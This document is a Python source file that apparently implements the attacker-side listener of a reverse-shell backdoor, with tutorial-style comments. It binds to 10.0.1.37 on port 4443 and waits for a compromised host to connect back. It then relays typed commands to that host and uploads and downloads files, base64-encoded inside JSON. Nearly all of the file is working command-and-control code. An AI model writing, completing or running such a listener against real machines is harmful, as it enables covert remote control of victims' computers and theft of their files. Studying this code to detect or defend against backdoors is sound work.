import socket
import json
import os
import base64


class Listener:
    def __init__(self, ip, port):
        l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # CREATES A SOCKET OBJECT.AF_INET STANDS FOR IPV4 AND SOCK_STREAM FOR TCP PACKET
        l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # CHANGE OPTIONS OF SOCKET.HERE THE SOCKET IS MADE REUSABLE
        l.bind((ip, port))  # LISTEN FOR INCOMING CONNECTIONS IN PORT 4444
        l.listen(0)
        print("[+] WAITING FOR CONNECTION [+]\n")
        self.conn, addr = l.accept()  # ACCEPT THE CONNECTIONS
        print("[+] GOT A CONNECTION FROM " + str(addr[0]) + " [+]\n")

    def send_json(self, data):
        json_data = json.dumps(data)  # CONVERT TCP STREAMS TO JSON DATA FOR RELIABLE TRANSFER FOR DATA
        self.conn.send(json_data.encode())  # Encode to bytes before sending

    def recieve_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(1024).decode()  # Decode bytes to string
                return json.loads(json_data)  # IT SENDS THE FULL FILE TILL THE END OF THE STRING/DAT
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
            file.write(base64.b64decode(content))
            return "[+] Download successful [+]"

    def read_file(self, path):  # RB FOR READABLE BINARY FILE
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()  # Decode bytes to string

    def execute(self, command):
        self.send_json(command)
        if command[0] == "exit":
            self.conn.close()
            exit()
        return self.recieve_json()

    def run(self):
        while True:
            command = input(">")  # Use input for Python 3
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    # HERE WE ARE SENDING A LIST OF ["UPLOAD","SAMPLE.TXT",THE CONTENT INSIDE SAMPLE.TX]
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                response = self.execute(command)
                if command[0] == "download":
                    response = self.write_file(command[1], response)
            except Exception:
                response = "[+] Error during executing the command [+] "
            print(response)


listener = Listener("10.0.1.37", 4443)
listener.run()
